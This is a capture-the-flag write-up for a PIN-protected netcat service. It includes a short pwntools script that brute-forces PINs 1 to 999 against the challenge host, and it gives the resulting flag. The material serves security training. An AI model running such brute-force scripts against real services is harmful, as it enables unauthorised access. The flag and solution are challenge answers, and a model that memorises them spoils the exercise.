# Prog

We made a simple program to protect our flag. Only us with the pin can access the flag!

`nc 185.125.168.82 2337`

[⬇️ server.py](./server.py)


# Writeup

Saw the code and seems like bruteforce was the simplest method, a little [python script](solve.py) to do that:

```python
from pwn import *

context.log_level = 'error'
p = remote('185.125.168.82', 2337)
p.recvuntil(b'?')

for i in range(1,1000):
    p.sendline(str(i).encode())
    ans = p.recvline().decode()
    if 'No.' not in ans:
        print(i, ans)
        p.interactive()
        break
```


# Flag

```
telenor{bruteforce_is_the_best}
```